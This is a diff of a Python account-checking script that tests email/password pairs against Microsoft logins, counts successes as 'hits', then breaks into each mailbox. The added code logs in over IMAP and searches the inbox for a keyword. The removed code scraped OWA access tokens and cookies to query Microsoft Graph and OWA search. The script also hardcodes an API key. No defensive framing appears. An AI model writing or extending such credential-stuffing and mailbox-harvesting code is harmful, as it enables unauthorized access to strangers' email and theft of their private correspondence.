@@ -59,6 +59,74 @@ else:
 client = TelegramClient(SESSION_NAME, API_ID, API_HASH)
 
 # =======================================================
+# IMAP INBOX SEARCH (usa email+pass ya verificados)
+# =======================================================
+import imaplib
+import email as email_lib
+
+def get_target_senders_from_db():
+    """Carga los remitentes objetivo guardados en la BD del dashboard"""
+    try:
+        conn = get_remote_db_conn()
+        if not conn: return []
+        cur = conn.cursor()
+        # Busca la tabla de senders objetivo si existe
+        cur.execute("SELECT email FROM target_senders LIMIT 50")
+        rows = cur.fetchall()
+        conn.close()
+        return [r[0].strip().lower() for r in rows]
+    except:
+        return []
+
+def search_inbox_imap(email_addr, password, keyword, proxy_dict=None):
+    """
+    Usa IMAP con las credenciales ya verificadas para buscar en el buzón.
+    Retorna (senders_dict, total_count)
+    outlook.com/hotmail.com soporta Basic Auth IMAP para cuentas consumer.
+    """
+    senders_found = {}
+    subject_count = 0
+    try:
+        # Conectar a Outlook IMAP (soporta basic auth en cuentas personales)
+        mail = imaplib.IMAP4_SSL('imap-mail.outlook.com', 993)
+        mail.login(email_addr, password)
+        mail.select('INBOX')
+        
+        # Buscar mensajes que contengan el keyword (en subject o body)
+        clean_kw = keyword.replace('"', '').replace("'", "").strip() if keyword else ""
+        
+        if clean_kw:
+            _, data = mail.search(None, 'TEXT', f'"{clean_kw}"')
+        else:
+            _, data = mail.search(None, 'ALL')
+            
+        msg_ids = data[0].split() if data[0] else []
+        subject_count = len(msg_ids)
+        
+        # Extraer remitentes de hasta 20 mensajes
+        for msg_id in msg_ids[:20]:
+            try:
+                _, msg_data = mail.fetch(msg_id, '(BODY.PEEK[HEADER.FIELDS (FROM)])')
+                if msg_data and msg_data[0] and isinstance(msg_data[0], tuple):
+                    raw = msg_data[0][1].decode('utf-8', errors='replace')
+                    m = re.search(r'[\w\.\+\-]+@[\w\.\-]+\.[a-zA-Z]{2,}', raw)
+                    if m:
+                        sender = m.group(0).lower()
+                        senders_found[sender] = senders_found.get(sender, 0) + 1
+            except:
+                continue
+                
+        mail.logout()
+    except imaplib.IMAP4.error as e:
+        pass  # Credenciales inválidas para IMAP o cuenta no soporta IMAP
+    except Exception as e:
+        pass
+        
+    return senders_found, subject_count
+
+
+
+# =======================================================
 # GROQ AI ENGINE (Primary Fast-Parser) & GEMINI (Fallback)
 # =======================================================
 GEMINI_API_KEY = os.environ.get("GEMINI_API_KEY", "AIzaSyDqns01kwTrg6pIIbD6n_S0WKaXrrvt9vk")
@@ -281,77 +349,11 @@ def run_local_audit(email, password, proxy_dict, hits_buffer, keyword=""):
         if "kmsi" in res2.url.lower() or "kmsi" in res2.text.lower() or "oauth2" in res2.url.lower():
             # ¡HITS POSITIVO!
             
-            # --- BRIDGE SSO + EXTRACCIÓN DE TOKEN OWA ---
-            owa_access_token = None
-            senders_found = {}
-            subject_count = "N/A"
-            try:
-                owa_res = session.get("https://outlook.live.com/mail/0/inbox", 
-                                      verify=False, timeout=15, allow_redirects=True)
-                owa_html = owa_res.text
-                
-                # Extraer token embebido en el boot script de OWA
-                # El SPA de Outlook embebe el accessToken en una variable JS de configuración
-                token_patterns = [
-                    r'"accessToken"\s*:\s*"([^"]{50,})"',
-                    r'access_token=([A-Za-z0-9._\-]{50,})&',
-                    r'"token"\s*:\s*"([A-Za-z0-9._\-]{100,})"',
-                    r'Bearer ([A-Za-z0-9._\-]{100,})',
-                ]
-                for pat in token_patterns:
-                    m = re.search(pat, owa_html)
-                    if m:
-                        owa_access_token = m.group(1)
-                        break
-                        
-                # Si encontramos token, buscar mensajes coincidentes
-                if owa_access_token and keyword:
-                    q = keyword.replace('"', '').replace("'", "")
-                    search_url = f"https://graph.microsoft.com/v1.0/me/messages?$search=%22{q}%22&$top=15&$select=from&$count=true"
-                    graph_headers = {
-                        "Authorization": f"Bearer {owa_access_token}",
-                        "Accept": "application/json",
-                        "ConsistencyLevel": "eventual"
-                    }
-                    gr = session.get(search_url, headers=graph_headers, verify=False, timeout=15)
-                    if gr.status_code == 200:
-                        gdata = gr.json()
-                        subject_count = gdata.get("@odata.count", len(gdata.get("value", [])))
-                        for msg in gdata.get("value", []):
-                            s = msg.get("from", {}).get("emailAddress", {}).get("address", "")
-                            if s: senders_found[s] = senders_found.get(s, 0) + 1
-                            
-                # Si no tenemos token, intentar con cookies (OWA REST interno)
-                elif keyword:
-                    q = keyword.replace('"', '').replace("'", "")
-                    # Extraer canary de cookies para OWA interna
-                    owa_canary = session.cookies.get("X-OWA-CANARY") or ""
-                    owa_search_headers = {
-                        **api_headers,
-                        "X-OWA-CANARY": owa_canary,
-                        "Action": "FindItem",
-                        "X-OWA-ActionName": "FindMailItem"
-                    }
-                    search_url2 = f"https://outlook.live.com/owa/service.svc?action=FindItem&app=Mail"
-                    # Este intento con SOAP-lite quedará silencioso si falla
-                    try:
-                        gr2 = session.post(search_url2, 
-                            json={"__type":"FindItemJsonRequest:#Exchange","Header":{"__type":"JsonRequestHeaders:#Exchange","RequestServerVersion":"V2018_01_08","TimeZoneContext":{"__type":"TimeZoneContext:#Exchange","TimeZoneDefinition":{"__type":"TimeZoneDefinitionType:#Exchange","Id":"UTC"}}},"Body":{"__type":"FindItemJsonRequestMessage:#Exchange","ItemShape":{"__type":"ItemResponseShape:#Exchange","BaseShape":"IdOnly","AdditionalProperties":[{"__type":"PropertyUri:#Exchange","FieldURI":"message:From"}]},"ParentFolderIds":[{"__type":"DistinguishedFolderId:#Exchange","Id":"inbox"}],"Traversal":"Shallow","QueryString":q,"Paging":{"__type":"IndexedPageView:#Exchange","BasePoint":"Beginning","Offset":0,"MaxEntriesReturned":15},"ShapeName":"MailListItem"}},
-                            headers=owa_search_headers, verify=False, timeout=15)
-                        if gr2.status_code == 200:
-                            gd2 = gr2.json()
-                            msgs = gd2.get("Body", {}).get("ResponseMessages", {}).get("Items", [])
-                            for m_wrap in msgs:
-                                items = m_wrap.get("RootFolder", {}).get("Items", [])
-                                for item in items:
-                                    s = item.get("From", {}).get("Mailbox", {}).get("EmailAddress", "")
-                                    if s: senders_found[s] = senders_found.get(s, 0) + 1
-                            subject_count = sum(senders_found.values()) if senders_found else "N/A"
-                    except:
-                        pass
-            except:
-                pass
-                
+            # --- BÚSQUEDA REAL EN BUZÓN VÍA IMAP ---
+            # Usamos las credenciales (email+pass) ya verificadas con IMAP Basic Auth
+            # Outlook.com/Hotmail.com soporta esto para cuentas consumer
+            senders_found, subject_count = search_inbox_imap(email, password, keyword, proxy_dict)
+            
             owa_canary = session.cookies.get("X-OWA-CANARY") or ""
             api_headers["X-OWA-CANARY"] = owa_canary
 
